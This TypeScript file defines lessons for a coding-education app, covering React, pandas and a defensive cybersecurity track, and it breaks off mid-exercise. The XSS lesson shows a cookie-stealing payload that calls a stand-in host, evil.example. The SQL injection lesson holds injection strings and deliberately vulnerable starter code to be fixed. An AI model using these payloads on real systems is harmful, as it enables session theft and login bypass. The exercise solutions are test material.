import type { Track } from './types';

// React lessons load React + Babel from a CDN inside the sandboxed preview, so JSX works without a build step.
const REACT_HEAD = `<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <script src="https://cdn.jsdelivr.net/npm/react@18.3.1/umd/react.development.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.3.1/umd/react-dom.development.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.26.4/babel.min.js"></script>
  <style>body { font-family: system-ui, sans-serif; padding: 12px; } button { margin: 2px; }</style>
</head>
<body>
  <div id="root"></div>
  <script type="text/babel">
`;
const REACT_TAIL = `
ReactDOM.createRoot(document.getElementById("root")).render(<App />);
  </script>
</body>
</html>
`;
const react = (app: string) => REACT_HEAD + app + REACT_TAIL;
const WAIT = 'await sleep(400);\n';

export const reactTrack: Track = {
  id: 'react',
  title: 'React',
  icon: '⚛️',
  tier: 5,
  color: '#61dafb',
  kind: 'skill',
  blurb: 'The most popular UI library: components, props, state, lists, forms and hooks, with a live preview.',
  depth: 'full',
  lessons: [
    {
      id: 'react-components',
      title: 'Components, JSX & props',
      xp: 55,
      body: `
React builds UIs from **components**: functions that return **JSX** (HTML-like syntax in JavaScript):

~~~jsx
function Badge({ label, color = "purple" }) {          // props are function arguments
  return <span style={{ background: color }}>{label}</span>;
}

function App() {
  const skills = ["React", "TypeScript"];
  return (
    <div>
      <h1>Hello</h1>
      <Badge label="New" />
      <p>{skills.length} skills</p>                      {/* {} embeds JavaScript */}
    </div>
  );
}
~~~

JSX rules: one root element, \`className\` instead of \`class\`, close every tag, and **curly braces** for JavaScript expressions.

> 📦 React and Babel ship inside DevQuest, so these lessons work offline.
`,
      exercise: {
        kind: 'code',
        lang: 'web',
        prompt: 'Create a `ProfileCard` component taking `name` and `role` props that renders an `<h2>` with the name and a `<p className="role">` with the role. Render two cards inside `App`: Ada (Engineer) and Linus (Maintainer).',
        starter: react('function ProfileCard(props) {\n  return null;\n}\n\nfunction App() {\n  return <div>{/* render two ProfileCards */}</div>;\n}\n'),
        solution: react('function ProfileCard({ name, role }) {\n  return (\n    <div className="card">\n      <h2>{name}</h2>\n      <p className="role">{role}</p>\n    </div>\n  );\n}\n\nfunction App() {\n  return (\n    <div>\n      <ProfileCard name="Ada" role="Engineer" />\n      <ProfileCard name="Linus" role="Maintainer" />\n    </div>\n  );\n}\n'),
        hints: ['function ProfileCard({ name, role }) { return <div><h2>{name}</h2><p className="role">{role}</p></div>; }', 'Use the component like an HTML tag: <ProfileCard name="Ada" role="Engineer" />'],
        check: { type: 'web', tests: WAIT + "const h = $$('h2').map(e => e.textContent);\nassert(h.join() === 'Ada,Linus', 'Expected two <h2> headings Ada and Linus, got: ' + h.join(', '));\nconst roles = $$('p.role').map(e => e.textContent);\nassert(roles.join() === 'Engineer,Maintainer', 'Expected roles Engineer and Maintainer in <p className=\"role\">, got: ' + roles.join(', '));" },
      },
      cards: [{ front: 'React props', back: 'Read-only inputs passed to a component like HTML attributes: <Card title="x" />.' }],
    },
    {
      id: 'react-state',
      title: 'State with useState',
      xp: 60,
      body: `
**State** is data that changes over time. When state changes, React re-renders the component:

~~~jsx
function Counter() {
  const [count, setCount] = React.useState(0);   // [current value, setter]
  return (
    <div>
      <p>Clicked {count} times</p>
      <button onClick={() => setCount(count + 1)}>+1</button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}
~~~

Never mutate state directly (\`count++\`). Always call the setter. Use the function form \`setCount(c => c + 1)\` when the new value depends on the old one.
`,
      exercise: {
        kind: 'code',
        lang: 'web',
        prompt: 'Build a `LikeButton`: a `<button id="like">` showing `♡ 0`; clicking toggles between liked (`♥ 1`) and not liked (`♡ 0`). Also show `<p id="status">` with `You like this` or `Not liked yet`.',
        starter: react('function App() {\n  // const [liked, setLiked] = React.useState(false);\n  return <button id="like">♡ 0</button>;\n}\n'),
        solution: react('function App() {\n  const [liked, setLiked] = React.useState(false);\n  return (\n    <div>\n      <button id="like" onClick={() => setLiked((l) => !l)}>\n        {liked ? "♥ 1" : "♡ 0"}\n      </button>\n      <p id="status">{liked ? "You like this" : "Not liked yet"}</p>\n    </div>\n  );\n}\n'),
        hints: ['const [liked, setLiked] = React.useState(false);', 'onClick={() => setLiked(l => !l)}', 'Use a ternary in JSX: {liked ? "♥ 1" : "♡ 0"}'],
        check: { type: 'web', tests: WAIT + "const b = $('#like'), s = () => $('#status').textContent;\nassert(b && $('#status'), 'Need #like and #status');\nassert(b.textContent.trim() === '♡ 0' && s() === 'Not liked yet', 'Initial state should be ♡ 0 / Not liked yet');\nclick(b); await sleep(50);\nassert(b.textContent.trim() === '♥ 1' && s() === 'You like this', 'After one click: ♥ 1 / You like this');\nclick(b); await sleep(50);\nassert(b.textContent.trim() === '♡ 0', 'Clicking again should unlike');" },
      },
      cards: [{ front: 'useState', back: 'const [value, setValue] = useState(initial). Calling setValue re-renders the component.' }],
    },
    {
      id: 'react-lists',
      title: 'Lists, keys & filtering',
      xp: 60,
      body: `
Render arrays with \`.map()\`. Give each item a stable **key** so React can track it between renders:

~~~jsx
const todos = [{ id: 1, text: "Learn JSX", done: true }, { id: 2, text: "Learn state", done: false }];

<ul>
  {todos.filter(t => !t.done).map(t => (
    <li key={t.id}>{t.text}</li>
  ))}
</ul>
~~~

Use ids as keys, not array indexes (indexes break when items are reordered or removed).
`,
      exercise: {
        kind: 'code',
        lang: 'web',
        prompt: 'Render the `products` as `<li className="product">name — $price</li>` items. Add three buttons `#all`, `#cheap` (price < 50) and `#pricey` (price ≥ 50) that filter the list.',
        starter: react('const products = [\n  { id: 1, name: "Mouse", price: 25 },\n  { id: 2, name: "Monitor", price: 250 },\n  { id: 3, name: "Cable", price: 10 },\n  { id: 4, name: "Chair", price: 150 },\n];\n\nfunction App() {\n  return <ul></ul>;\n}\n'),
        solution: react('const products = [\n  { id: 1, name: "Mouse", price: 25 },\n  { id: 2, name: "Monitor", price: 250 },\n  { id: 3, name: "Cable", price: 10 },\n  { id: 4, name: "Chair", price: 150 },\n];\n\nconst FILTERS = { all: () => true, cheap: (p) => p.price < 50, pricey: (p) => p.price >= 50 };\n\nfunction App() {\n  const [filter, setFilter] = React.useState("all");\n  return (\n    <div>\n      {Object.keys(FILTERS).map((f) => (\n        <button key={f} id={f} onClick={() => setFilter(f)}>{f}</button>\n      ))}\n      <ul>\n        {products.filter(FILTERS[filter]).map((p) => (\n          <li key={p.id} className="product">{p.name} — ${p.price}</li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n'),
        hints: ['Keep the current filter in state: useState("all")', 'products.filter(...).map(p => <li key={p.id} className="product">…</li>)'],
        check: { type: 'web', tests: WAIT + "const items = () => $$('li.product').map(li => li.textContent.trim());\nassert(items().length === 4, 'All 4 products should show initially, got ' + items().length);\nassert(items()[0] === 'Mouse — $25', 'Format items as \"Mouse — $25\", got \"' + items()[0] + '\"');\nclick($('#cheap')); await sleep(50);\nassert(items().join() === 'Mouse — $25,Cable — $10', '#cheap should show Mouse and Cable, got ' + items().join(' | '));\nclick($('#pricey')); await sleep(50);\nassert(items().length === 2 && items()[0].startsWith('Monitor'), '#pricey should show Monitor and Chair');\nclick($('#all')); await sleep(50);\nassert(items().length === 4, '#all should show everything again');" },
      },
      cards: [{ front: 'React keys', back: 'A stable unique key on list items helps React match elements between renders; avoid array indexes.' }],
    },
    {
      id: 'react-forms',
      title: '🛠️ Forms, derived state & a mini app',
      xp: 90,
      body: `
**Controlled inputs** keep form values in state:

~~~jsx
const [text, setText] = React.useState("");
<input value={text} onChange={e => setText(e.target.value)} />
~~~

**Derive** values from state instead of storing duplicates: \`const remaining = todos.filter(t => !t.done).length\` is computed on each render, so it can never get out of sync.

Build a small but complete todo app: the core of most React interviews.
`,
      exercise: {
        kind: 'code',
        lang: 'web',
        prompt: 'Build a todo app: `<input id="text">`, `<button id="add">` (ignores blank input and clears the field), a list of `<li className="todo">` whose click toggles a `done` class, and `<p id="left">` showing `N left`.',
        starter: react('function App() {\n  return (\n    <div>\n      <input id="text" />\n      <button id="add">Add</button>\n      <ul></ul>\n      <p id="left">0 left</p>\n    </div>\n  );\n}\n'),
        solution: react('function App() {\n  const [text, setText] = React.useState("");\n  const [todos, setTodos] = React.useState([]);\n  const add = () => {\n    if (!text.trim()) return;\n    setTodos((t) => [...t, { id: Date.now() + Math.random(), text: text.trim(), done: false }]);\n    setText("");\n  };\n  const toggle = (id) => setTodos((t) => t.map((x) => (x.id === id ? { ...x, done: !x.done } : x)));\n  const left = todos.filter((t) => !t.done).length;\n  return (\n    <div>\n      <input id="text" value={text} onChange={(e) => setText(e.target.value)} />\n      <button id="add" onClick={add}>Add</button>\n      <ul>\n        {todos.map((t) => (\n          <li key={t.id} className={"todo" + (t.done ? " done" : "")} onClick={() => toggle(t.id)}>{t.text}</li>\n        ))}\n      </ul>\n      <p id="left">{left} left</p>\n    </div>\n  );\n}\n'),
        hints: ['Controlled input: value={text} onChange={e => setText(e.target.value)}', 'Never mutate: setTodos(t => [...t, newTodo]) and map to toggle.', 'className={"todo" + (t.done ? " done" : "")}'],
        check: {
          type: 'web',
          tests: WAIT + "const input = $('#text');\nconst setVal = (el, v) => { const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set; setter.call(el, v); el.dispatchEvent(new Event('input', { bubbles: true })); };\nsetVal(input, 'Learn hooks'); await sleep(30); click($('#add')); await sleep(50);\nsetVal(input, '   '); await sleep(30); click($('#add')); await sleep(50);\nsetVal(input, 'Ship app'); await sleep(30); click($('#add')); await sleep(50);\nassert($$('li.todo').length === 2, 'Expected 2 todos (blank ignored), got ' + $$('li.todo').length);\nassert(input.value === '', 'The input should clear after adding');\nassert($('#left').textContent.trim() === '2 left', '#left should say 2 left');\nclick($$('li.todo')[0]); await sleep(50);\nassert($$('li.todo')[0].classList.contains('done'), 'Clicking a todo should add the done class');\nassert($('#left').textContent.trim() === '1 left', '#left should update to 1 left');",
        },
      },
      cards: [{ front: 'Derived state', back: 'Values computed from existing state during render instead of being stored separately, so they never go out of sync.' }],
    },
  ],
};

export const dataAnalysis: Track = {
  id: 'data-analysis',
  title: 'Data Analysis with pandas',
  icon: '🐼',
  tier: 9,
  color: '#150458',
  kind: 'skill',
  blurb: 'Load, clean, transform and summarise data with pandas, the tool every data analyst and scientist uses daily.',
  depth: 'full',
  lessons: [
    {
      id: 'pd-intro',
      title: 'DataFrames & Series',
      xp: 55,
      body: `
**pandas** gives Python a **DataFrame**: a table with labelled columns, like a spreadsheet you can program.

~~~python
import pandas as pd
df = pd.DataFrame({
    "city": ["Paris", "Tokyo", "Lima"],
    "temp": [18, 24, 21],
})
df.head()              # first rows
df.shape               # (3, 2)
df["temp"]             # a Series (one column)
df["temp"].mean()      # 21.0
df[df["temp"] > 20]    # boolean filtering
df.sort_values("temp", ascending=False)
df["temp_f"] = df["temp"] * 9 / 5 + 32   # new column, vectorised
~~~

> 🐍 pandas downloads into DevQuest's Python the first time you use it (~15 MB).
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Build a DataFrame `df` from `data`. Add a column `revenue = price * qty`. Set `top` to the name of the product with the highest revenue and `total` to the total revenue.',
        starter: 'import pandas as pd\n\ndata = {"product": ["mouse", "laptop", "cable", "monitor"], "price": [25, 1200, 8, 250], "qty": [40, 3, 120, 10]}\ndf = None\ntop = None\ntotal = None\n',
        solution: 'import pandas as pd\n\ndata = {"product": ["mouse", "laptop", "cable", "monitor"], "price": [25, 1200, 8, 250], "qty": [40, 3, 120, 10]}\ndf = pd.DataFrame(data)\ndf["revenue"] = df["price"] * df["qty"]\ntop = df.loc[df["revenue"].idxmax(), "product"]\ntotal = int(df["revenue"].sum())\n',
        hints: ['df["revenue"] = df["price"] * df["qty"]', 'df.loc[df["revenue"].idxmax(), "product"] gets the product name of the max row.'],
        check: { type: 'tests', code: 'assert list(df["revenue"]) == [1000, 3600, 960, 2500], list(df["revenue"]) if df is not None else "df is None"\nassert top == "laptop", top\nassert total == 8060, total\n' },
      },
      cards: [{ front: 'DataFrame vs Series', back: 'A DataFrame is a table of columns; each column is a Series (a labelled 1-D array).' }],
    },
    {
      id: 'pd-clean',
      title: 'Cleaning messy data',
      xp: 60,
      body: `
Real data is messy. Typical cleaning steps:

~~~python
df.isna().sum()                         # missing values per column
df = df.dropna(subset=["email"])        # drop rows missing key fields
df["age"] = df["age"].fillna(df["age"].median())
df["price"] = pd.to_numeric(df["price"], errors="coerce")   # "n/a" → NaN
df["name"] = df["name"].str.strip().str.title()
df = df.drop_duplicates(subset=["email"])
df["date"] = pd.to_datetime(df["date"])
~~~

Analysts often spend 60–80% of their time cleaning. Clean data is what makes the analysis trustworthy.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Write `clean(df)` that: strips and title-cases `name`; converts `amount` to numbers (invalid → NaN) and fills missing amounts with 0; drops duplicate `email`s (keep first); returns the cleaned DataFrame with a fresh index.',
        starter: 'import pandas as pd\n\nraw = pd.DataFrame({\n    "name": ["  ada lovelace", "LINUS", "grace ", "ada lovelace"],\n    "email": ["ada@x.dev", "linus@x.dev", "grace@x.dev", "ada@x.dev"],\n    "amount": ["10.5", "n/a", None, "10.5"],\n})\n\ndef clean(df):\n    return df\n',
        solution: 'import pandas as pd\n\nraw = pd.DataFrame({\n    "name": ["  ada lovelace", "LINUS", "grace ", "ada lovelace"],\n    "email": ["ada@x.dev", "linus@x.dev", "grace@x.dev", "ada@x.dev"],\n    "amount": ["10.5", "n/a", None, "10.5"],\n})\n\ndef clean(df):\n    df = df.copy()\n    df["name"] = df["name"].str.strip().str.title()\n    df["amount"] = pd.to_numeric(df["amount"], errors="coerce").fillna(0)\n    df = df.drop_duplicates(subset=["email"])\n    return df.reset_index(drop=True)\n',
        hints: ['df["name"].str.strip().str.title()', 'pd.to_numeric(df["amount"], errors="coerce").fillna(0)', 'df.drop_duplicates(subset=["email"]).reset_index(drop=True)'],
        check: { type: 'tests', code: 'out = clean(raw)\nassert list(out["name"]) == ["Ada Lovelace", "Linus", "Grace"], list(out["name"])\nassert list(out["amount"]) == [10.5, 0.0, 0.0], list(out["amount"])\nassert list(out.index) == [0, 1, 2], "reset the index"\nassert list(raw["name"])[0] == "  ada lovelace", "do not modify the original DataFrame (use df.copy())"\n' },
      },
      cards: [{ front: "pd.to_numeric(..., errors='coerce')", back: 'Converts to numbers, turning invalid values into NaN instead of raising.' }],
    },
    {
      id: 'pd-groupby',
      title: 'Group, aggregate & pivot',
      xp: 60,
      body: `
**Split → apply → combine** is the heart of analysis:

~~~python
sales.groupby("region")["amount"].sum()
sales.groupby("region").agg(total=("amount", "sum"), orders=("amount", "count"), avg=("amount", "mean"))
sales.pivot_table(index="region", columns="month", values="amount", aggfunc="sum", fill_value=0)
sales["amount"].describe()       # count, mean, std, min, quartiles, max
~~~

It's exactly SQL's \`GROUP BY\`, in Python.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'From `sales`, build `summary`: one row per `region` (as the index) with columns `total` (sum of amount) and `orders` (count), sorted by `total` descending.',
        starter: 'import pandas as pd\n\nsales = pd.DataFrame({\n    "region": ["N", "S", "N", "E", "S", "N"],\n    "amount": [100, 200, 50, 75, 25, 30],\n})\nsummary = None\n',
        solution: 'import pandas as pd\n\nsales = pd.DataFrame({\n    "region": ["N", "S", "N", "E", "S", "N"],\n    "amount": [100, 200, 50, 75, 25, 30],\n})\nsummary = (\n    sales.groupby("region")\n    .agg(total=("amount", "sum"), orders=("amount", "count"))\n    .sort_values("total", ascending=False)\n)\n',
        hints: ['sales.groupby("region").agg(total=("amount", "sum"), orders=("amount", "count"))', '.sort_values("total", ascending=False)'],
        check: { type: 'tests', code: 'assert summary is not None\nassert list(summary.index) == ["S", "N", "E"], list(summary.index)\nassert list(summary["total"]) == [225, 180, 75], list(summary["total"])\nassert list(summary["orders"]) == [2, 3, 1], list(summary["orders"])\n' },
      },
      cards: [{ front: 'groupby().agg()', back: 'Named aggregations: df.groupby(k).agg(total=("col", "sum"), n=("col", "count")).' }],
    },
    {
      id: 'pd-merge',
      title: 'Joining datasets',
      xp: 55,
      body: `
Combine tables like SQL joins:

~~~python
orders.merge(customers, left_on="customer_id", right_on="id", how="left")
pd.concat([jan, feb])                         # stack rows
orders.merge(products, on="sku", how="inner", validate="many_to_one")
~~~

\`how\`: \`inner\` (only matches), \`left\` (keep all left rows), \`right\`, \`outer\` (everything). \`validate=\` catches unexpected duplicate keys before they silently multiply your rows.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Left-join `orders` with `customers` (on `customer_id` = `id`). Set `by_city` to a dict mapping city → total order amount; orders whose customer is unknown should count under city `"unknown"`.',
        starter: 'import pandas as pd\n\ncustomers = pd.DataFrame({"id": [1, 2, 3], "city": ["London", "Paris", "London"]})\norders = pd.DataFrame({"customer_id": [1, 2, 3, 4, 1], "amount": [10, 20, 30, 40, 5]})\nby_city = None\n',
        solution: 'import pandas as pd\n\ncustomers = pd.DataFrame({"id": [1, 2, 3], "city": ["London", "Paris", "London"]})\norders = pd.DataFrame({"customer_id": [1, 2, 3, 4, 1], "amount": [10, 20, 30, 40, 5]})\nmerged = orders.merge(customers, left_on="customer_id", right_on="id", how="left")\nmerged["city"] = merged["city"].fillna("unknown")\nby_city = merged.groupby("city")["amount"].sum().to_dict()\n',
        hints: ['orders.merge(customers, left_on="customer_id", right_on="id", how="left")', 'Unmatched rows get NaN city: fillna("unknown") before grouping.'],
        check: { type: 'tests', code: 'assert by_city == {"London": 45, "Paris": 20, "unknown": 40}, by_city\n' },
      },
      cards: [{ front: 'Left join', back: 'Keeps every row of the left table; unmatched right-side columns become NaN.' }],
    },
    {
      id: 'pd-project',
      title: '🛠️ Mini project: Monthly sales report',
      xp: 90,
      body: `
Put it together: parse dates, derive a month column, aggregate and compute growth, exactly what an analyst does for a weekly business review.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Write `monthly_report(csv_text)` that reads the CSV (use `io.StringIO`), parses `date`, and returns a DataFrame indexed by month (`"2026-01"` style strings) with columns `revenue` (sum of qty × price) and `growth` (percent change vs previous month, rounded to 1 decimal, NaN for the first month).',
        starter: 'import io\nimport pandas as pd\n\nCSV = """date,qty,price\n2026-01-05,2,10\n2026-01-20,1,30\n2026-02-03,5,10\n2026-02-28,2,25\n2026-03-15,1,40\n"""\n\ndef monthly_report(csv_text):\n    pass\n',
        solution: 'import io\nimport pandas as pd\n\nCSV = """date,qty,price\n2026-01-05,2,10\n2026-01-20,1,30\n2026-02-03,5,10\n2026-02-28,2,25\n2026-03-15,1,40\n"""\n\ndef monthly_report(csv_text):\n    df = pd.read_csv(io.StringIO(csv_text), parse_dates=["date"])\n    df["revenue"] = df["qty"] * df["price"]\n    df["month"] = df["date"].dt.strftime("%Y-%m")\n    out = df.groupby("month")[["revenue"]].sum()\n    out["growth"] = (out["revenue"].pct_change() * 100).round(1)\n    return out\n',
        hints: ['pd.read_csv(io.StringIO(csv_text), parse_dates=["date"])', 'df["date"].dt.strftime("%Y-%m") gives the month key.', 'out["revenue"].pct_change() * 100'],
        check: { type: 'tests', code: 'import math\nr = monthly_report(CSV)\nassert list(r.index) == ["2026-01", "2026-02", "2026-03"], list(r.index)\nassert list(r["revenue"]) == [50, 100, 40], list(r["revenue"])\ng = list(r["growth"])\nassert math.isnan(g[0]) and g[1] == 100.0 and g[2] == -60.0, g\n' },
      },
      cards: [],
    },
  ],
};

export const security: Track = {
  id: 'security',
  title: 'Cybersecurity',
  icon: '🛡️',
  tier: 9,
  color: '#dc2626',
  kind: 'skill',
  blurb: 'Think like an attacker, defend like an engineer: threat modelling, password storage, injection, XSS and log forensics.',
  depth: 'full',
  lessons: [
    {
      id: 'sec-basics',
      title: 'Security mindset & threat modelling',
      xp: 45,
      body: `
Security protects the **CIA triad**:
- **Confidentiality**: only authorised people can read data (encryption, access control).
- **Integrity**: data isn't tampered with (hashes, signatures, validation).
- **Availability**: systems stay up (redundancy, DDoS protection, backups).

**Threat modelling** asks four questions: *What are we building? What can go wrong? What will we do about it? Did we do a good job?* The **STRIDE** checklist covers what can go wrong:

| Threat | Violates | Example |
|---|---|---|
| **S**poofing | authentication | stolen session cookie |
| **T**ampering | integrity | editing a price in a request |
| **R**epudiation | accountability | no audit log |
| **I**nformation disclosure | confidentiality | verbose error leaks stack trace |
| **D**enial of service | availability | unbounded upload size |
| **E**levation of privilege | authorisation | user calls admin endpoint |

Principles: **least privilege**, **defence in depth**, **secure defaults**, **never trust input**, keep dependencies patched, log security events. Careers: penetration tester (red team), SOC analyst / incident responder (blue team), AppSec engineer, cloud security engineer.
`,
      exercise: {
        kind: 'quiz',
        questions: [
          { q: 'An attacker changes "price=100" to "price=1" in a checkout request. Which STRIDE threat?', options: ['Spoofing', 'Tampering', 'Repudiation', 'Denial of service'], answer: 1 },
          { q: 'A regular user can call /api/admin/deleteUser. This is…', options: ['Elevation of privilege', 'Information disclosure', 'Repudiation', 'Availability'], answer: 0 },
          { q: 'Ransomware encrypting all servers mainly attacks…', options: ['Confidentiality', 'Availability', 'Integrity only', 'Nothing'], answer: 1 },
          { q: '"Give each service only the permissions it needs" is…', options: ['Defence in depth', 'Least privilege', 'Security through obscurity', 'Zero-day'], answer: 1 },
        ],
      },
      cards: [
        { front: 'CIA triad', back: 'Confidentiality, Integrity, Availability.' },
        { front: 'STRIDE', back: 'Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.' },
      ],
    },
    {
      id: 'sec-passwords',
      title: '🛠️ Storing passwords safely',
      xp: 70,
      body: `
**Never store passwords in plain text, and never with fast hashes like MD5 or SHA-256 alone.** Attackers who steal the database can try billions of guesses per second.

Do this instead:
1. Generate a random **salt** per user (defeats precomputed "rainbow tables").
2. Use a **slow, salted password-hashing function**: **Argon2id** (best) or **scrypt**, which are also *memory-hard* (they need lots of RAM, so GPU cracking rigs gain little); **bcrypt**, or **PBKDF2** with many iterations, are slow but not memory-hard, and are acceptable where Argon2id isn't available.
3. Compare hashes in **constant time** (\`hmac.compare_digest\`) to avoid timing attacks.

~~~python
import hashlib, hmac, os
salt = os.urandom(16)
digest = hashlib.pbkdf2_hmac("sha256", b"hunter2", salt, 200_000)
~~~
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Implement `hash_password(pw)` returning `"<salt hex>$<hash hex>"` using a random 16-byte salt and PBKDF2-HMAC-SHA256 (100,000 iterations), and `verify_password(pw, stored)` using `hmac.compare_digest`.',
        starter: 'import hashlib\nimport hmac\nimport os\n\nITERATIONS = 100_000\n\ndef hash_password(pw):\n    pass\n\ndef verify_password(pw, stored):\n    pass\n',
        solution: 'import hashlib\nimport hmac\nimport os\n\nITERATIONS = 100_000\n\ndef hash_password(pw):\n    salt = os.urandom(16)\n    digest = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS)\n    return f"{salt.hex()}${digest.hex()}"\n\ndef verify_password(pw, stored):\n    salt_hex, digest_hex = stored.split("$")\n    digest = hashlib.pbkdf2_hmac("sha256", pw.encode(), bytes.fromhex(salt_hex), ITERATIONS)\n    return hmac.compare_digest(digest.hex(), digest_hex)\n',
        hints: ['salt = os.urandom(16); hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS)', 'Store salt.hex() + "$" + digest.hex(); to verify, split, re-derive with the same salt and compare_digest.'],
        check: { type: 'tests', code: 'a = hash_password("correct horse")\nb = hash_password("correct horse")\nassert isinstance(a, str) and "$" in a, a\nassert a != b, "two hashes of the same password must differ (random salt)"\nassert "correct horse" not in a, "never store the password itself"\nsalt, h = a.split("$")\nassert len(salt) == 32 and len(h) == 64, "16-byte salt and SHA-256 digest, hex encoded"\nassert verify_password("correct horse", a)\nassert not verify_password("Correct horse", a)\nassert not verify_password("", a)\n' },
      },
      cards: [{ front: 'Why salt passwords?', back: 'A unique random salt per user makes identical passwords hash differently and defeats precomputed rainbow tables.' }],
    },
    {
      id: 'sec-sqli',
      title: '🛠️ SQL injection: attack & fix',
      xp: 70,
      body: `
If user input is **concatenated** into SQL, the input can change the query itself:

~~~python
query = f"SELECT * FROM users WHERE name = '{name}' AND pw = '{pw}'"
# name = "admin' --"  →  ... WHERE name = 'admin' --' AND pw = '...'   (password check commented out!)
~~~

**Fix:** always use **parameterised queries**. The driver sends data separately from the SQL, so input can never become code:

~~~python
conn.execute("SELECT * FROM users WHERE name = ? AND pw = ?", (name, pw))
~~~

ORMs (SQLAlchemy, Django ORM, Prisma) parameterise for you. Also apply least privilege to the database account, and never show raw SQL errors to users.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'The `login` function is vulnerable to SQL injection. Rewrite it with a **parameterised query** so normal logins still work but injection payloads fail.',
        starter: 'import sqlite3\n\nconn = sqlite3.connect(":memory:")\nconn.execute("CREATE TABLE users (name TEXT, pw TEXT)")\nconn.execute("INSERT INTO users VALUES (\'admin\', \'s3cret\'), (\'ada\', \'lovelace\')")\n\ndef login(name, pw):\n    query = f"SELECT name FROM users WHERE name = \'{name}\' AND pw = \'{pw}\'"\n    row = conn.execute(query).fetchone()\n    return row is not None\n',
        solution: 'import sqlite3\n\nconn = sqlite3.connect(":memory:")\nconn.execute("CREATE TABLE users (name TEXT, pw TEXT)")\nconn.execute("INSERT INTO users VALUES (\'admin\', \'s3cret\'), (\'ada\', \'lovelace\')")\n\ndef login(name, pw):\n    row = conn.execute("SELECT name FROM users WHERE name = ? AND pw = ?", (name, pw)).fetchone()\n    return row is not None\n',
        hints: ['Replace the f-string with "… WHERE name = ? AND pw = ?" and pass (name, pw) as the second argument to execute.'],
        check: { type: 'tests', code: 'assert login("ada", "lovelace") is True\nassert login("ada", "wrong") is False\nfor name, pw in [("admin\' --", "x"), ("x", "\' OR \'1\'=\'1"), ("admin\'/*", "*/--")]:\n    try:\n        ok = login(name, pw)\n    except Exception:\n        ok = False\n    assert ok is False, f"injection succeeded with name={name!r} pw={pw!r}"\n' },
      },
      cards: [{ front: 'Parameterised query', back: 'SQL with placeholders (?, $1) where values are sent separately, so input can never change the query structure.' }],
    },
    {
      id: 'sec-xss',
      title: '🛠️ Cross-site scripting (XSS)',
      xp: 60,
      body: `
**XSS** happens when user input is inserted into a page as HTML, letting attackers run JavaScript in other users' browsers (stealing sessions, defacing pages).

~~~python
comment = '<img src=x onerror="fetch(\\'//evil.example/?c=\\'+document.cookie)">'
html = f"<p>{comment}</p>"          # ❌ executes in every visitor's browser
html = f"<p>{escape(comment)}</p>"  # ✅ &lt;img ...&gt; shows as text
~~~

Defences: **escape output** for its context (HTML body, attribute, URL, JS), let template engines and frameworks auto-escape (React, Jinja2), avoid \`innerHTML\` with user data, set a **Content-Security-Policy**, and mark cookies \`HttpOnly\`.
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Write `render_comments(comments)` that returns `<ul>` HTML with one `<li><b>author</b>: text</li>` per comment, **escaping** both author and text with `html.escape`. Also write `safe_url(url)` that returns the URL if it starts with `http://` or `https://`, else `"#"` (blocks `javascript:` links).',
        starter: 'import html\n\ndef render_comments(comments):\n    items = "".join(f"<li><b>{c[\'author\']}</b>: {c[\'text\']}</li>" for c in comments)\n    return f"<ul>{items}</ul>"\n\ndef safe_url(url):\n    return url\n',
        solution: 'import html\n\ndef render_comments(comments):\n    items = "".join(f"<li><b>{html.escape(c[\'author\'])}</b>: {html.escape(c[\'text\'])}</li>" for c in comments)\n    return f"<ul>{items}</ul>"\n\ndef safe_url(url):\n    return url if url.lower().startswith(("http://", "https://")) else "#"\n',
        hints: ['html.escape(text) converts < > & " \' into entities.', 'url.lower().startswith(("http://", "https://"))'],
        check: { type: 'tests', code: 'out = render_comments([{"author": "ada", "text": "Nice post!"}, {"author": "<script>", "text": "<img src=x onerror=alert(1)>"}])\nassert out.startswith("<ul><li><b>ada</b>: Nice post!</li>"), out\nassert "<script>" not in out and "<img" not in out, "user input must be escaped"\nassert "&lt;img src=x onerror=alert(1)&gt;" in out, out\nassert safe_url("https://devquest.dev") == "https://devquest.dev"\nassert safe_url("JavaScript:alert(1)") == "#"\nassert safe_url("data:text/html,hi") == "#"\n' },
      },
      cards: [{ front: 'XSS defence', back: 'Escape output for its context, use auto-escaping frameworks, avoid innerHTML with user data, add a Content-Security-Policy.' }],
    },
    {
      id: 'sec-forensics',
      title: '🛠️ Log forensics: detect a brute-force attack',
      xp: 80,
      body: `
Blue teams hunt attacks in logs. A **brute-force** or **credential-stuffing** attack shows up as many failed logins from one IP, often against many usernames, sometimes followed by a success (a compromised account!).

You'll write a small detector, the logic behind SIEM rules (Splunk, Elastic, Sentinel).
`,
      exercise: {
        kind: 'code',
        lang: 'python',
        prompt: 'Parse the auth log lines with a regex. `detect(lines, threshold)` returns a sorted list of IPs with at least `threshold` failed logins. `compromised(lines, threshold)` returns `(ip, user)` pairs where a flagged IP later had a successful login.',
        starter: 'import re\n\nLOG = """2026-10-12T10:00:01 FAIL user=admin ip=10.0.0.5\n2026-10-12T10:00:02 FAIL user=root ip=10.0.0.5\n2026-10-12T10:00:03 OK user=ada ip=192.168.1.2\n2026-10-12T10:00:04 FAIL user=test ip=10.0.0.5\n2026-10-12T10:00:05 FAIL user=ada ip=172.16.0.9\n2026-10-12T10:00:06 FAIL user=guest ip=10.0.0.5\n2026-10-12T10:00:07 OK user=guest ip=10.0.0.5\n2026-10-12T10:00:08 FAIL user=bob ip=172.16.0.9\n""".splitlines()\n\ndef detect(lines, threshold=3):\n    pass\n\ndef compromised(lines, threshold=3):\n    pass\n',
